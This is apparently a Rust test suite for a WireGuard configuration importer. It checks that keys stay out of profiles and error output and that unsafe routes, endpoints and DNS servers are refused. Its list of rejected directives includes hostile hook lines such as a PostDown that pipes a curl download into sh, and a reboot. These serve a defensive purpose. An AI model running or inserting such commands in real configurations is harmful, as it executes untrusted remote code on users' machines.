//! Tests for the WireGuard `.conf` import. Every key below is FAKE: 32 bytes of one repeated value (for example
//! `[0x11; 32]`), generated here and never a real key. The canary key stands in for a private key in the leak checks.

use crate::b64;
use crate::net::{default_cluster_cidrs, Cidr, Context};
use crate::profile::Body;
use crate::wgconf::{parse, parse_endpoint};
use crate::VpnError;

fn k(n: u8) -> String {
    b64::encode(&[n; 32])
}

fn ctx() -> Context {
    Context { cluster: default_cluster_cidrs(), lan: vec![Cidr::parse("192.168.1.0/24").unwrap()], tunnel: vec![] }
}

fn conf() -> String {
    format!(
        "[Interface]\nPrivateKey = {}\nAddress = 10.8.0.2/24, fd00:8::2/64\nDNS = 10.8.0.1\nMTU = 1380\n\n[Peer]\nPublicKey = {}\nPresharedKey = {}\nEndpoint = vpn.example.com:51820\nAllowedIPs = 0.0.0.0/0, ::/0\nPersistentKeepalive = 25\n",
        k(0x11),
        k(0x22),
        k(0x33)
    )
}

fn with(extra_iface: &str, extra_peer: &str) -> String {
    let c = conf();
    let c = c.replace("MTU = 1380\n", &format!("MTU = 1380\n{extra_iface}\n"));
    format!("{c}{extra_peer}\n")
}

#[test]
fn a_normal_profile_becomes_a_typed_profile_and_the_keys_go_to_the_secrets() {
    let imp = parse("Office", conf().as_bytes(), &ctx()).unwrap();
    let Body::Wireguard(w) = &imp.body else { panic!() };
    assert_eq!(w.addresses.len(), 2);
    assert_eq!(w.dns, vec!["10.8.0.1".parse::<std::net::IpAddr>().unwrap()]);
    assert_eq!(w.mtu, Some(1380));
    assert_eq!(w.peers.len(), 1);
    let p = &w.peers[0];
    assert_eq!(p.public_key.to_string(), k(0x22));
    assert_eq!(p.endpoint.as_ref().unwrap().to_string(), "vpn.example.com:51820");
    assert_eq!(p.keepalive, Some(25));
    assert!(p.has_preshared);
    assert!(w.full_tunnel());
    assert_eq!(imp.secrets.private_key.as_ref().unwrap().expose(), &[0x11; 32]);
    assert_eq!(imp.secrets.preshared.len(), 1);
    assert_eq!(imp.secrets.preshared[0].1.expose(), &[0x33; 32]);
    assert!(imp.warnings.is_empty(), "{:?}", imp.warnings);
}

#[test]
fn the_profile_has_no_secret_in_it_in_any_form() {
    let imp = parse("Office", conf().as_bytes(), &ctx()).unwrap();
    let (profile, _secrets, warnings) = imp.into_profile("p1");
    let json = serde_json::to_string(&profile).unwrap();
    for secret in [k(0x11), k(0x33)] {
        assert!(!json.contains(&secret));
        assert!(!format!("{profile:?}").contains(&secret));
        assert!(!warnings.join(" ").contains(&secret));
    }
    // and the public key is there, so the test would notice an empty profile
    assert!(json.contains(&k(0x22)));
    let back: crate::Profile = serde_json::from_str(&json).unwrap();
    assert_eq!(back, profile);
    assert_eq!(back.kind(), crate::Kind::Wireguard);
    assert_eq!(back.endpoint_label().unwrap(), "vpn.example.com:51820");
}

#[test]
fn imported_values_and_debug_output_never_show_the_private_key() {
    let imp = parse("Office", conf().as_bytes(), &ctx()).unwrap();
    let dbg = format!("{imp:?}");
    assert!(!dbg.contains(&k(0x11)) && !dbg.contains(&k(0x33)));
    assert!(dbg.contains("Secret(..)"));
}

#[test]
fn script_and_routing_table_settings_are_refused_with_a_reason() {
    for (line, name) in [
        ("PostUp = /usr/bin/touch /tmp/x", "PostUp"),
        ("PreUp = ls", "PreUp"),
        ("PostDown = curl http://example.com | sh", "PostDown"),
        ("PreDown = reboot", "PreDown"),
        ("SaveConfig = true", "SaveConfig"),
        ("Table = 1234", "Table"),
        ("Table = off", "Table"),
        ("FwMark = 51820", "FwMark"),
        ("postup = lower case does not help", "postup"),
        ("Unknown = 1", "Unknown"),
    ] {
        match parse("x", with(line, "").as_bytes(), &ctx()) {
            Err(VpnError::Rejected { directive, .. }) => assert_eq!(directive, name),
            other => panic!("{line}: {other:?}"),
        }
    }
    // the same names in a peer section
    let peer = format!("[Peer]\nPublicKey = {}\nAllowedIPs = 10.8.0.9/32\nPostUp = id\n", k(0x44));
    assert!(matches!(parse("x", with("", &peer).as_bytes(), &ctx()), Err(VpnError::Rejected { .. })));
    // FwMark off / 0 is harmless
    assert!(parse("x", with("FwMark = off", "").as_bytes(), &ctx()).is_ok());
    assert!(parse("x", with("FwMark = 0", "").as_bytes(), &ctx()).is_ok());
}

#[test]
fn a_refused_line_does_not_echo_its_value() {
    let e = parse("x", with("PostUp = echo canary-value-123", "").as_bytes(), &ctx()).unwrap_err();
    assert!(!e.to_string().contains("canary-value-123"));
    // a bare key pasted on a line makes its first part look like a setting name: it must not be shown either
    let bare = format!("[Interface]\n{}\n", k(0x77));
    let e = parse("x", bare.as_bytes(), &ctx()).unwrap_err();
    assert!(!e.to_string().contains(&k(0x77)[..10]), "{e}");
    let e = parse("x", format!("[Interface]\n{}=\n", &k(0x77)[..43]).as_bytes(), &ctx()).unwrap_err();
    assert!(!e.to_string().contains(&k(0x77)[..10]), "{e}");
}

#[test]
fn odd_input_is_refused() {
    let big = "#".repeat(300 * 1024);
    assert!(matches!(parse("x", big.as_bytes(), &ctx()), Err(VpnError::TooLarge(_))));
    let long_line = format!("{}\n# {}\n", conf(), "a".repeat(9000));
    assert!(matches!(parse("x", long_line.as_bytes(), &ctx()), Err(VpnError::TooLarge(_))));
    let many = format!("{}{}", conf(), "\n".repeat(5000));
    assert!(matches!(parse("x", many.as_bytes(), &ctx()), Err(VpnError::TooLarge(_))));
    for bad in ["\0", "\u{1b}[31m", "\u{7f}", "a\rb", "\u{85}"] {
        let c = format!("{}\n# {bad}\n", conf());
        assert!(matches!(parse("x", c.as_bytes(), &ctx()), Err(VpnError::BadText(_))), "{bad:?}");
    }
    assert!(matches!(parse("x", &[0xff, 0xfe, b'a'], &ctx()), Err(VpnError::BadText(_))));
    // a BOM and CRLF line ends are accepted
    let crlf = format!("\u{feff}{}", conf().replace('\n', "\r\n"));
    assert!(parse("x", crlf.as_bytes(), &ctx()).is_ok());
    for name in ["", "   ", &"n".repeat(41), "bad\nname"] {
        assert!(matches!(parse(name, conf().as_bytes(), &ctx()), Err(VpnError::BadText(_))), "{name:?}");
    }
}

#[test]
fn structure_and_values_are_checked() {
    let ok = conf();
    for (from, to) in [
        ("PrivateKey = ", "PrivateKey = x"),
        ("Address = 10.8.0.2/24, fd00:8::2/64", "Address = 10.8.0.2/40"),
        ("MTU = 1380", "MTU = 20"),
        ("MTU = 1380", "MTU = 100000"),
        ("Endpoint = vpn.example.com:51820", "Endpoint = vpn.example.com"),
        ("Endpoint = vpn.example.com:51820", "Endpoint = vpn.example.com:0"),
        ("Endpoint = vpn.example.com:51820", "Endpoint = vpn.example.com:70000"),
        ("Endpoint = vpn.example.com:51820", "Endpoint = ::1:51820"),
        ("Endpoint = vpn.example.com:51820", "Endpoint = bad host:51820"),
        ("Endpoint = vpn.example.com:51820", "Endpoint = 300.1.1.1:51820"),
        ("PersistentKeepalive = 25", "PersistentKeepalive = soon"),
        ("AllowedIPs = 0.0.0.0/0, ::/0", "AllowedIPs = nonsense"),
        ("[Peer]", "[Pear]"),
    ] {
        let c = if to == "PrivateKey = x" { ok.replace(&format!("PrivateKey = {}", k(0x11)), to) } else { ok.replace(from, to) };
        assert!(parse("x", c.as_bytes(), &ctx()).is_err(), "{to}");
    }
    // missing pieces
    let no_peer = ok.split("[Peer]").next().unwrap().to_string();
    assert!(matches!(parse("x", no_peer.as_bytes(), &ctx()), Err(VpnError::Missing(_))));
    let no_key = ok.replace(&format!("PrivateKey = {}\n", k(0x11)), "");
    assert!(matches!(parse("x", no_key.as_bytes(), &ctx()), Err(VpnError::Missing(_))));
    let no_addr = ok.replace("Address = 10.8.0.2/24, fd00:8::2/64\n", "");
    assert!(matches!(parse("x", no_addr.as_bytes(), &ctx()), Err(VpnError::Missing(_))));
    let no_allowed = ok.replace("AllowedIPs = 0.0.0.0/0, ::/0\n", "");
    assert!(matches!(parse("x", no_allowed.as_bytes(), &ctx()), Err(VpnError::Missing(_))));
    assert!(matches!(parse("x", b"PrivateKey = a\n", &ctx()), Err(VpnError::Invalid { .. })));
    assert!(matches!(parse("x", format!("{ok}[Interface]\n").as_bytes(), &ctx()), Err(VpnError::Invalid { .. })));
    // keys of the wrong length
    let short = ok.replace(&k(0x22), &b64::encode(&[1u8; 31]));
    assert!(parse("x", short.as_bytes(), &ctx()).is_err());
}

#[test]
fn routes_and_endpoints_in_the_profile_go_through_the_threat_checks() {
    let ok = conf();
    for allowed in ["10.42.0.0/24", "10.43.0.0/16", "127.0.0.0/8", "169.254.169.254/32", "192.168.1.0/24", "10.0.0.0/8"] {
        let c = ok.replace("AllowedIPs = 0.0.0.0/0, ::/0", &format!("AllowedIPs = {allowed}"));
        assert!(matches!(parse("x", c.as_bytes(), &ctx()), Err(VpnError::Unsafe(_))), "{allowed}");
    }
    // the VPN's own network: no warning; another private range: a warning
    let own = ok.replace("AllowedIPs = 0.0.0.0/0, ::/0", "AllowedIPs = 10.8.0.0/24");
    assert!(parse("x", own.as_bytes(), &ctx()).unwrap().warnings.is_empty());
    let other = ok.replace("AllowedIPs = 0.0.0.0/0, ::/0", "AllowedIPs = 172.20.0.0/16");
    assert_eq!(parse("x", other.as_bytes(), &ctx()).unwrap().warnings.len(), 1);
    for ep in ["127.0.0.1:51820", "10.42.0.5:51820", "169.254.169.254:80", "[::1]:51820"] {
        let c = ok.replace("vpn.example.com:51820", ep);
        assert!(matches!(parse("x", c.as_bytes(), &ctx()), Err(VpnError::Unsafe(_))), "{ep}");
    }
    let lan = ok.replace("vpn.example.com:51820", "192.168.1.10:51820");
    assert!(parse("x", lan.as_bytes(), &ctx()).unwrap().warnings.iter().any(|w| w.contains("local network")));
    // DNS: names are search domains and are ignored with a warning; bad servers are refused
    let names = ok.replace("DNS = 10.8.0.1", "DNS = 10.8.0.1, corp.example");
    let imp = parse("x", names.as_bytes(), &ctx()).unwrap();
    assert_eq!(imp.warnings.len(), 1);
    for dns in ["127.0.0.1", "10.43.0.10"] {
        let c = ok.replace("DNS = 10.8.0.1", &format!("DNS = {dns}"));
        assert!(matches!(parse("x", c.as_bytes(), &ctx()), Err(VpnError::Unsafe(_))), "{dns}");
    }
}

#[test]
fn warnings_for_a_full_tunnel_without_dns_and_for_no_endpoint() {
    let c = conf().replace("DNS = 10.8.0.1\n", "").replace("Endpoint = vpn.example.com:51820\n", "");
    let w = parse("x", c.as_bytes(), &ctx()).unwrap().warnings;
    assert!(w.iter().any(|m| m.contains("without DNS")));
    assert!(w.iter().any(|m| m.contains("Endpoint")));
}

#[test]
fn endpoint_forms() {
    assert_eq!(parse_endpoint("1.2.3.4:5").unwrap().host, "1.2.3.4");
    assert_eq!(parse_endpoint("[2001:db8::1]:51820").unwrap().to_string(), "[2001:db8::1]:51820");
    assert_eq!(parse_endpoint("a-b.example:1").unwrap().port, 1);
    for bad in ["", ":1", "host:", "host:x", "[::1:5", "[host]:5", "1.2.3:5", "a b:5", "-a.com:5", "a..com:5", "host:5:6", "host:05x"] {
        assert!(parse_endpoint(bad).is_none(), "{bad:?}");
    }
}

#[test]
fn too_many_peers_and_duplicates_are_refused() {
    let peer = |n: u8| format!("[Peer]\nPublicKey = {}\nAllowedIPs = 10.8.{n}.0/24\n", k(n));
    let mut c = conf();
    for n in 50..60u8 {
        c.push_str(&peer(n));
    }
    assert!(parse("x", c.as_bytes(), &ctx()).is_err());
    let dup = conf().replace("MTU = 1380\n", &format!("MTU = 1380\nPrivateKey = {}\n", k(0x12)));
    assert!(parse("x", dup.as_bytes(), &ctx()).is_err());
}
